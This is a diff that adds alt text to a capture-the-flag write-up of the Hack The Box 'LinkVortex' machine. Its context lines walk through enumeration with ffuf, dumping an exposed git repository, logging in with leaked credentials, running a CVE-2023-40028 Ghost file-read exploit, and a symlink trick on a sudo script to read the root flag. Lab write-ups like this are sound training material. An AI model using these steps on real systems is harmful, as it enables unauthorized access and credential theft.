@@ -33,7 +33,7 @@ nmap -A TARGET -oN vortex.nmap --min-rate 10000 -Pn
 | 22       | ssh         |
 | 80       | http        |
 
-![](https://cdn.ziomsec.com/linkvortex/1.webp)
+![nmap scan on linkvortex machine](https://cdn.ziomsec.com/linkvortex/1.webp)
 
 I added the machine domain to my */etc/hosts* file for name resolution.
 
@@ -41,7 +41,7 @@ I added the machine domain to my */etc/hosts* file for name resolution.
 
 Since the server had an **http** service running, I visited the website from my browser.
 
-![](https://cdn.ziomsec.com/linkvortex/2.webp)
+![accessing the web application](https://cdn.ziomsec.com/linkvortex/2.webp)
 
 I then performed a directory bruteforce using **ffuf** to find other files and directories.
 
@@ -49,15 +49,15 @@ I then performed a directory bruteforce using **ffuf** to find other files and d
 ffuf -u http://linkvortex.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -mc 200,302
 ```
 
-![](https://cdn.ziomsec.com/linkvortex/3.webp)
+![running a fuff scan on linkvortex](https://cdn.ziomsec.com/linkvortex/3.webp)
 
 The **ffuf** scan revealed *robots.txt* file which gave me some more endpoints.
 
-![](https://cdn.ziomsec.com/linkvortex/4.webp)
+![accessing robots.txt on the web application](https://cdn.ziomsec.com/linkvortex/4.webp)
 
 The `/ghost` endpoint took me to a login page.
 
-![](https://cdn.ziomsec.com/linkvortex/5.webp)
+![accessing ghost login panel](https://cdn.ziomsec.com/linkvortex/5.webp)
 
 I tried logging in using a default mail and common password but failed. Since I had no other leads, I tried brute forcing subdomains.
 
@@ -65,13 +65,13 @@ I tried logging in using a default mail and common password but failed. Since I 
 ffuf -u http://linkvortex.htb/ -H "HOST: FUZZ.linkvortex.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200,302 
 ```
 
-![](https://cdn.ziomsec.com/linkvortex/6.webp)
+![running fuzz scan on linkvortex to find subdomain](https://cdn.ziomsec.com/linkvortex/6.webp)
 
 I added the new subdomain to my *hosts* file.
 
 I then visited the newly discovered subdomain and found a message stating the site was under construction.
 
-![](https://cdn.ziomsec.com/linkvortex/7.webp)
+![accessing a subdomain I discovered](https://cdn.ziomsec.com/linkvortex/7.webp)
 
 I again performed a directory bruteforce to find directories and files in the subdomain and found a git repository.
 
@@ -79,9 +79,9 @@ I again performed a directory bruteforce to find directories and files in the su
 ffuf -u http://dev.linkvortex.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -mc 200,302,301
 ```
 
-![](https://cdn.ziomsec.com/linkvortex/8.webp)
+![directory bruteforcing for the discovered subdomain](https://cdn.ziomsec.com/linkvortex/8.webp)
 
-![](https://cdn.ziomsec.com/linkvortex/9.webp)
+![accessing the git repository](https://cdn.ziomsec.com/linkvortex/9.webp)
 
 I then used **githack** to download this repository locally.
 - https://github.com/lijiejie/GitHack
@@ -92,7 +92,7 @@ $ cd GitHack
 $ python GitHack.py http://dev.linkvortex.htb/.git/
 ```
 
-![](https://cdn.ziomsec.com/linkvortex/10.webp)
+![downloading the discovered git repository](https://cdn.ziomsec.com/linkvortex/10.webp)
 
 After downloading the repository, I inspected it and found the admin credentials in:
 
@@ -100,11 +100,11 @@ After downloading the repository, I inspected it and found the admin credentials
 /ghost/core/test/regression/api/admin/authentication.test.js
 ```
 
-![](https://cdn.ziomsec.com/linkvortex/11.webp)
+![accessing hardcoded credentials](https://cdn.ziomsec.com/linkvortex/11.webp)
 
 I then logged into `ghost` CMS using these credentials. I was able to identify the version using **wappalizer** so I searched for exploits related to it.
 
-![](https://cdn.ziomsec.com/linkvortex/12.webp)
+![using wappalyzer to find cms version](https://cdn.ziomsec.com/linkvortex/12.webp)
 
 Ghost 5.58 was vulnerable to **cve-2023-40028** (lfi), so I used the following exploit to attack the target:
 - https://github.com/monke443/CVE-2023-40028
@@ -113,13 +113,13 @@ Ghost 5.58 was vulnerable to **cve-2023-40028** (lfi), so I used the following e
 python3 exploit.py --user 'admin@linkvortex.htb' --password 'OctopiFociPilfer45' --url http://linkvortex.htb
 ```
 
-![](https://cdn.ziomsec.com/linkvortex/13.webp)
+![exploiting an existing CVE of the ghost cms version](https://cdn.ziomsec.com/linkvortex/13.webp)
 
 I then read the CMS config from `/var/lib/ghost/config.production.json` (the Dockerfile revealed this path earlier)
 
 Here, I found credentials for another user.
 
-![](https://cdn.ziomsec.com/linkvortex/14.webp)
+![discovering credentials of another user](https://cdn.ziomsec.com/linkvortex/14.webp)
 
 I was able to use these credentials to log in via **ssh**.
 
@@ -127,11 +127,11 @@ I was able to use these credentials to log in via **ssh**.
 ssh bob@TARGET
 ```
 
-![](https://cdn.ziomsec.com/linkvortex/15.webp)
+![logging in as bob using ssh](https://cdn.ziomsec.com/linkvortex/15.webp)
 
 Finally I captured the user flag from its home directory.
 
-![](https://cdn.ziomsec.com/linkvortex/16.webp)
+![capturing user flag](https://cdn.ziomsec.com/linkvortex/16.webp)
 
 ## Privilege Escalation
 
@@ -141,7 +141,7 @@ I viewed my **sudo** privileges and found that I was allowed to run a particular
 sudo -l
 ```
 
-![](https://cdn.ziomsec.com/linkvortex/17.webp)
+![discovering sudo permissions](https://cdn.ziomsec.com/linkvortex/17.webp)
 
 I viewed the bash script to see what it does:
 
@@ -149,7 +149,7 @@ I viewed the bash script to see what it does:
 cat /opt/ghost/clean_symlink.sh
 ```
 
-![](https://cdn.ziomsec.com/linkvortex/18.webp)
+![exploring the bash script](https://cdn.ziomsec.com/linkvortex/18.webp)
 
 > The script was intended to process symbolic links pointing to `.png` files. It has a variable `CHECK_CONTENT` that controls whether the contents of quarantined  files are printed. If the symlink points to `/etc` or `/root`, it is deleted. Else, it is quarantined.
 
@@ -168,7 +168,7 @@ Hence, I created a link to the root flag on my home directory.
 ln -s /root/root.txt /home/bob/flag.txt
 ```
 
-![](https://cdn.ziomsec.com/linkvortex/19.webp)
+![creating a symlink to the root flag](https://cdn.ziomsec.com/linkvortex/19.webp)
 
 I then linked this link to another `png` file on my home directory.
 
@@ -176,7 +176,7 @@ I then linked this link to another `png` file on my home directory.
 ln -s /home/bob/flag.txt /home/bob/flag.png
 ```
 
-![](https://cdn.ziomsec.com/linkvortex/20.webp)
+![lynking the existing link to a png](https://cdn.ziomsec.com/linkvortex/20.webp)
 
 Finally, I executed the script with the `CHECK_CONTENT` variable:
 
@@ -184,7 +184,7 @@ Finally, I executed the script with the `CHECK_CONTENT` variable:
 sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh flag.png
 ```
 
-![](https://cdn.ziomsec.com/linkvortex/21.webp)
+![reading the root flag via symlinks using the bash script](https://cdn.ziomsec.com/linkvortex/21.webp)
 
 ## Closure
 
